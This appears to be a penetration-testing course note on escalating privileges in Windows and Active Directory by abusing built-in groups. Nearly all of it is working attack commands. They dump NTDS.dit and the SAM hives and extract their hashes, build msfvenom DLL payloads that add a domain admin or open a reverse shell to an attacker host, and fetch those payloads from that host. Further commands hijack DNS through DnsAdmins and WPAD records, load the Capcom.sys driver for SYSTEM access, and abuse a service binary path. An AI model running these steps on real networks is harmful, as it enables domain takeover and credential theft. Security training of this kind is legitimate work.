# Windows Group Privilege

In this section will cover:
- Windows Built-in Groups (Backup Operators)
- Event Log Readers
- DnsAdmins
- Hyper-V Administrators
- Print Operators
- Server Operators

## Windows Built-in Groups (Backup Operators)

Have a variety of built-in groups that either ship with the operating system or get added when the Active Directory Domain Services role is installed on a system to promote a server to a Domain Controller. Many of these groups confer special privileges on their members, and some can be leveraged to escalate privileges on a server or a Domain Controller. Here is a listing of all built-in Windows groups along with a detailed description of each. This page has a detailed listing of privileged accounts and groups in Active Directory. It is essential to understand the implications of membership in each of these groups whether we gain access to an account that is a member of one of them or notice excessive/unnecessary membership in one or more of these groups during an assessment.

|Backup Operators|	Event Log Readers	|DnsAdmins|
|-----------------|------------------|---------|
|Hyper-V Administrators	|Print Operators|	Server Operators|

### Backup Operators

````
> whoami /groups
BUILTIN\Backup Operators
````

After landing on a machine, we can use the command whoami /groups to show our current group memberships. Let's examine the case where we are a member of the Backup Operators group. Membership of this group grants its members the SeBackup and SeRestore privileges. 
- SeBackupPrivilege
- SeRestorePrivilege

**Preparation and Activation**
````
# Importing Libraries

> Import-Module .\SeBackupPrivilegeUtils.dll
> Import-Module .\SeBackupPrivilegeCmdLets.dll

# Verifying SeBackupPrivilege is Enabled
> whoami /priv
SeBackupPrivilege             Back up files and directories  Disabled

> Get-SeBackupPrivilege
SeBackupPrivilege is disabled

# Enabling SeBackupPrivilege
> Set-SeBackupPrivilege
````
This privilege can now be leveraged to copy any protected file.

**Copying a Protected File**
````
> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
````

**Copy NTDS.dit**
````
# Method - diskshadow.exe

## Step 1 - Create shadow copy of the C drive
> diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

## Step 2 - Verify if E drive exist
> dir E:

## Step 3 - Copying NTDS.dit
> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\ntds.dit

# Step 3 - Copying NTDS.dit with Robocopy
> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
````
**Backing up SAM and SYSTEM Registry Hives**
````
> reg save HKLM\SYSTEM SYSTEM.SAV
> reg save HKLM\SAM SAM.SAV
````
**Extracting Credentials from NTDS.dit**
````
# From Windows
> Import-Module .\DSInternals.psd1
> $key = Get-BootKey -SystemHivePath .\SYSTEM
> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

# From Linux
$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
````

## Event Log Readers

Suppose auditing of process creation events and corresponding command line values is enabled. In that case, this information is saved to the Windows security event log as event ID 4688: A new process has been created. Organizations may enable logging of process command lines to help defenders monitor and identify possibly malicious behavior and identify binaries that should not be present on a system. This data can be shipped to a SIEM tool or ingested into a search tool, such as ElasticSearch, to give defenders visibility into what binaries are being run on systems in the network. 

This study shows some of the most run commands by attackers after initial access (tasklist, ver, ipconfig, systeminfo, etc.), for reconnaissance (dir, net view, ping, net use, type, etc.), and for spreading malware within a network (at, reg, wmic, wusa, etc.). Aside from monitoring for these commands being run, an organization could take things a step further and restrict the execution of specific commands using fine-tuned AppLocker rules.

**Confirming Group Membership**
````
> net localgroup "Event Log Readers"
Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine
Members
-------------------------------------------------------------------------------
<user>
The command completed successfully.
````
**Search For Security Logs**
````
# Using wevtutil
> wevtutil qe Security /rd:true /f:text | Select-String "/user"

# Using wevtutil with creds
> wevtutil qe Security /rd:true /f:text /r:share01 /u:<user> /p:<password> | findstr "/user"

# Get-WinEvent (Powershell)
> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
````

## DnsAdmins

Members of the DnsAdmins group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as NT AUTHORITY\SYSTEM, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. 

The following attack can be performed when DNS is run on a Domain Controller (which is very common):
- DNS management is performed over RPC
- ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
- When a member of the DnsAdmins group runs the dnscmd command below, the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

**Leveraging DnsAdmins Access**
````
# Verify GroupMember DnsAdmins
> Get-ADGroupMember -Identity DnsAdmins

# Finding User's SID
> wmic useraccount where name="<user>" get sid

# Checking Permissions on DNS Service
> sc.exe sdshow DNS

# Step 1 - Generating Malicious DLL
$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Our_IP> LPORT=<Our_Port> -f dll -o reverse.dll

# Step 2 - Downloading File to Target
>  wget "http://<Our_IP>:7777/adduser.dll" -outfile "adduser.dll"

# Step 3 - Loading Custom DLL
> dnscmd.exe /config /serverlevelplugindll C:\Users\<user>\Desktop\adduser.dll

# Step 4 - Stopping the DNS Service
> sc stop dns

# Step 5 - Starting the DNS Service
> sc start dns

# Step 6 - Confirming the result
> net group "Domain Admins" /dom
or Reverse Shell
````
**Cleaning Up**
````
# Confirming Registry Key Added
> reg query \\<IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

# Deleting Registry Key
> reg delete \\<IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

# Starting the DNS Service Again
> sc.exe start dns

# Checking DNS Service Status
> sc query dns
````
**Creating a WPAD Record**

Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to disable global query block security, which by default blocks this attack. After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.
````
# Disabling the Global Query Block List
> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.<domain>

# Adding a WPAD Record
> Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain> -ComputerName dc01.<domain> -IPv4Address <IP>
````

## Hyper-V Administrators

The Hyper-V Administrators group has full access to all Hyper-V features. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.

If the operating system is vulnerable to CVE-2018-0952 or CVE-2019-0841, we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.

An example of this is Firefox, which installs the Mozilla Maintenance Service. We can update this exploit (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:
````
Exploit: https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1

# Target File
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

# Taking Ownership of the File
> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

# Starting the Mozilla Maintenance Service
> sc.exe start MozillaMaintenance
````

## Print Operators

Print Operators is another highly privileged group, which grants its members the **SeLoadDriverPrivilege**, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command whoami /priv, and don't see the SeLoadDriverPrivilege from an unelevated context, we will need to bypass UAC.

It's well known that the driver Capcom.sys contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges.

**LoadDriver**
````
# Add Reference to Driver
> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The odd syntax \??\ used to reference our malicious driver's ImagePath is an NT Object Path.

# Verify Privilege is Enabled
> EnableSeLoadDriverPrivilege.exe

# Verify Driver is not Loaded
> .\DriverView.exe /stext drivers.txt
> cat drivers.txt | Select-String -pattern Capcom

# Use ExploitCapcom Tool to Escalate Privileges
> .\ExploitCapcom.exe
````
**Alternate Exploitation - No GUI**

If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace "C:\\Windows\\system32\\cmd.exe" with, say, a reverse shell binary created with msfvenom, for example: c:\ProgramData\revshell.exe.
````
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}

# TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe"); -> This could be msfvenom revshell
# Compile
cl /DUNICODE /D_UNICODE ExploitCapcom.cpp
````
**Automating the Steps**

We can use a tool such as EoPLoadDriver to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver. To do this, we would run the following:
````
# Step 1 - Run EoPLoadDriver
> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

# Step 2 - Run ExploitCapcom.exe
> .\ExploitCapcom.exe
````
**Clean-up**
````
# Removing Registry Key
> reg delete HKCU\System\CurrentControlSet\Capcom
````

## Server Operators

The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services.

**AppReadiness Service**
````
# Querying the AppReadiness Service
> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

# Checking Service Permissions with PsService
> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All


# Checking Local Admin Group Membership
> net localgroup Administrators
````
**Exploitation**
````
# Modifying the Service Binary Path
> sc config AppReadiness binPath= "cmd /c net localgroup Administrators <user> /add"
> sc config AppReadiness binPath= "<command>"
> sc config AppReadiness binPath= "cmd /c powershell -e revshell_base64"

# Starting the Service
> sc start AppReadiness

# Confirming Local Admin Group Membership
> net localgroup Administrators
````

